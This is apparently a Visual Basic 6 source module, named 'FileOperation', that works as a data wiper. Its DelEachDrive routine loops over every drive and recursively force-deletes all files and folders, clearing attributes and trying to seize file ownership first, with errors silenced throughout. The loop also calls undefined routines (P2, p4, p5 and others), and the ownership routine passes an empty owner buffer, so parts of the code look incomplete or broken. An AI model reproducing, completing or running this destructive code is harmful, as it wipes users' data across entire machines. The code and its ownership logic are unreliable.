Attribute VB_Name = "FileOperation"
Public T
Private Declare Function SetFileSecurity Lib "advapi32.dll" Alias "SetFileSecurityA" (ByVal lpFileName As String, ByVal SecurityInformation As Long, pSecurityDescriptor As Any) As Long

Private Declare Function GetFileSecurity Lib "advapi32.dll" Alias "GetFileSecurityA" (ByVal lpFileName As String, ByVal RequestedInformation As Long, pSecurityDescriptor As Any, ByVal nLength As Long, lpnLengthNeeded As Long) As Long

Private Declare Function InitializeSecurityDescriptor Lib "advapi32.dll" (pSecurityDescriptor As Any, ByVal dwRevision As Long) As Long

Private Declare Function SetSecurityDescriptorOwner Lib "advapi32.dll" (pSecurityDescriptor As Any, pOwner As Any, ByVal bOwnerDefaulted As Long) As Long

Private Const OWNER_SECURITY_INFORMATION = &H1

Public Sub TakeOwnership(ByVal sFileName As String)
    Dim lResult As Long
    Dim lLengthNeeded As Long
    Dim tSD(0 To 1023) As Byte
    Dim tOwner(0 To 1023) As Byte
    
    Call InitializeSecurityDescriptor(tSD(0), 1)
    Call SetSecurityDescriptorOwner(tSD(0), ByVal VarPtr(tOwner(0)), 0)
    
    lResult = GetFileSecurity(sFileName, OWNER_SECURITY_INFORMATION, tSD(0), 1024, lLengthNeeded)
    
    
    lResult = SetFileSecurity(sFileName, OWNER_SECURITY_INFORMATION, tSD(0))
    
End Sub

Sub DelEachDrive()
On Error Resume Next
        Dim a As New FileSystemObject, b As Drive
        For Each b In a.Drives
                DeleteFolder b.Path
        Next
End Sub
Sub DeleteFolder(Path As String)
    Dim fso As New FileSystemObject, folder As folder, subfolder As folder, file As file
On Error Resume Next
    Set folder = fso.GetFolder(Path)

    For Each subfolder In folder.SubFolders
        DeleteFolder subfolder.Path
    Next

    For Each file In folder.Files
        file.Attributes = Normal
		TakeOwnership file.path
        file.Delete True
        P2
        p4
        p5
        p7
        p8
        p9
    Next

    folder.Delete True
End Sub
